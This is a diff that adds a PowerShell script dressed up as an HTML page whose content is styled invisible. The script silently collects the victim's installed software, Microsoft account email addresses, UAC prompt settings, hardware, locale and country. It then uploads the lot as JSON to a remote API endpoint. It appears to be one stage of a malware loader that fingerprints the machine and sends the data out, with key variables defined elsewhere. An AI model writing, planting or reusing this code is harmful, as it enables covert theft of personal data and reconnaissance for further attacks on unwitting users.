@@ -1,0 +1,104 @@
+
+# <!DOCTYPE html><html lang="en"><head><style>* { display: none }</style></head><body>
+function ConvertTo-UnixTime($date) { try { ([DateTimeOffset]$date).ToUnixTimeMilliseconds() } catch { $null } }
+
+function Get-UACSettings {
+	$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+
+	$ConsentPromptBehaviorAdmin = Get-RegistryValue $Key "ConsentPromptBehaviorAdmin"
+	$PromptOnSecureDesktop = Get-RegistryValue $Key "PromptOnSecureDesktop"
+
+	if ($ConsentPromptBehaviorAdmin -eq 5) {
+		if ($PromptOnSecureDesktop -eq 1) { return "SECURE_DESKTOP" }
+
+		return "NO_DIM"
+	}
+
+	if ($ConsentPromptBehaviorAdmin -eq 2) { return "ALWAYS" }
+
+	return "NEVER"
+}
+
+function Get-InstalledSoftware {
+	Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
+	Get-ChildItem "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
+
+	New-PSDrive HKU Registry HKEY_USERS | Out-Null
+	Get-ChildItem -Path "HKU:\" -Name | ForEach-Object {
+		Get-ChildItem "HKU:\$_\Software\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
+		Get-ChildItem "HKU:\$_\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
+	}
+}
+
+function Get-Emails {
+	New-PSDrive HKU Registry HKEY_USERS | Out-Null
+	Get-ChildItem -Path "HKU:\" -Name | ForEach-Object { (Get-ChildItem "HKU:\$_\Software\Microsoft\IdentityCRL\UserExtendedProperties" -Name -ErrorAction SilentlyContinue).PSChildName } 
+}
+
+$CI = Get-ComputerInfo | Select-Object -Property WindowsRegisteredOwner, WindowsSystemRoot, BiosManufacturer, BiosName, BiosReleaseDate, BiosVersion, CsName, CsDomain, CsManufacturer, CsModel, CsNetworkAdapters, CsNumberOfLogicalProcessors, CsProcessors, CsPartOfDomain, CsPhyicallyInstalledMemory, OsName, OsVersion, OsLocale, OsInstallDate, OsMuiLanguages, OsLanguage, TimeZone
+
+$UAC = Get-UACSettings
+$GEO = Get-RegistryValue "HKCU:\Control Panel\International\Geo" "Name"
+$GPUS = (Get-WmiObject Win32_VideoController).Name
+$Software = Get-InstalledSoftware
+$Emails = Get-Emails
+
+$Info = @{
+	machineId = $GUID
+	windows   = @{
+		registeredOwner = $CI.WindowsRegisteredOwner
+		systemRoot      = $CI.WindowsSystemRoot
+		software        = @($Software | ForEach-Object {
+				@{
+					name      = $_.GetValue("DisplayName")
+					version   = $_.GetValue("DisplayVersion")
+					publisher = $_.GetValue("Publisher")
+				}
+			} | Where-Object { $null -ne $_.name })
+		emails          = @($Emails | Where-Object { $null -ne $_ })
+	}
+	bios      = @{
+		manufacturer = $CI.BiosManufacturer
+		name         = $CI.BiosName
+		releaseDate  = ConvertTo-UnixTime $CI.BiosReleaseDate
+		version      = $CI.BiosVersion
+	}
+	system    = @{
+		name              = $CI.CsName
+		domain            = $CI.CsDomain
+		manufacturer      = $CI.CsManufacturer
+		model             = $CI.CsModel
+		partOfDomain      = $CI.CsPartOfDomain
+		installedMemory   = $CI.CsPhyicallyInstalledMemory
+		logicalProcessors = $CI.CsNumberOfLogicalProcessors
+		gpus              = @($GPUS)
+		processors        = @($CI.CsProcessors | ForEach-Object {
+				@{
+					name              = $_.Name
+					manufacturer      = $_.Manufacturer
+					cores             = $_.NumberOfCores
+					logicalProcessors = $_.NumberOfLogicalProcessors
+				}
+			})
+		networkAdapters   = @($CI.CsNetworkAdapters | ForEach-Object {
+				@{
+					name        = $_.ConnectionID
+					description = $_.Description
+				}
+			})
+	}
+	os        = @{
+		name         = $CI.OsName
+		version      = $CI.OsVersion
+		locale       = $CI.OsLocale
+		uacPrompt    = $UAC
+		muiLanguages = $CI.OsMUILanguages
+		country      = $GEO
+		language     = $CI.OsLanguage
+		timeZone     = $CI.TimeZone
+		installDate  = ConvertTo-UnixTime $CI.OsInstallDate
+	}
+}
+
+Invoke-WebRequest -Uri $API -WebSession $WebSession -Method POST -Body (ConvertTo-Json $Info -Depth 3) -ContentType "application/json; charset=utf-8" -UseBasicParsing
+# </body></html>
